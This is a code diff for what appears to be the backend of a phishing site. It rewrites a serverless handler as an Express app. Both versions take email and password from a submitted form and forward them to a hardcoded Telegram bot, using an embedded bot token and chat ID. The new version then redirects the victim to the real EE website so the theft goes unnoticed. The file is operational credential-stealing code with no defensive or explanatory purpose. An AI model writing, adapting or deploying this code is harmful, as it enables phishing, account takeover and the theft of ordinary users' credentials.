@@ -1,34 +1,42 @@
-import fetch from 'node-fetch';
+// Import required modules
+const express = require('express');
+const axios = require('axios');
 
-export default async function handler(req, res) {
-    if (req.method === 'POST') {
-        try {
-            const { email, password } = req.body;
+// Initialize Express app
+const app = express();
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-            // Log received credentials
-            console.log('Received credentials:', { email, password });
+// Telegram Bot API details
+const telegramBotToken = '7446927328:AAFxuMN3fv-VL4nh-H1MgratEarJJML9ybI'; // Updated bot token
+const chatId = '7670161927'; // Updated chat ID
 
-            // Send credentials to Telegram bot
-            const telegramBotToken = '7446927328:AAFxuMN3fv-VL4nh-H1MgratEarJJML9ybI'; // Bot token
-            const chatId = '7670161927'; // Chat ID extracted from getUpdates
-            const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
-            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-            console.log('Sending message to Telegram:', telegramUrl);
+// Handle POST request from the form
+app.post('/api/submit', async (req, res) => {
+    try {
+        const { email, password } = req.body;
 
-            const response = await fetch(telegramUrl);
-            const result = await response.json();
-            console.log('Telegram API response:', result);
-
-            if (!response.ok) {
-                throw new Error(`Telegram API error: ${result.description}`);
-            }
-
-            res.status(200).json({ success: true });
-        } catch (error) {
-            console.error('Error in submit.js:', error.message);
-            res.status(500).json({ error: 'Failed to process request' });
+        // Validate input
+        if (!email || !password) {
+            return res.status(400).send('Email and password are required.');
         }
-    } else {
-        res.status(405).json({ error: 'Method not allowed' });
+
+        // Prepare message for Telegram
+        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;
+
+        // Send message to Telegram bot
+        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            chat_id: chatId,
+            text: message,
+        });
+
+        // Redirect user to https://ee.co.uk/
+        res.redirect('https://ee.co.uk/');
+    } catch (error) {
+        console.error('Error processing request:', error);
+        res.status(500).send('An error occurred while processing your request.');
     }
-}
+});
+
+// Export the handler for Vercel
+module.exports = app;
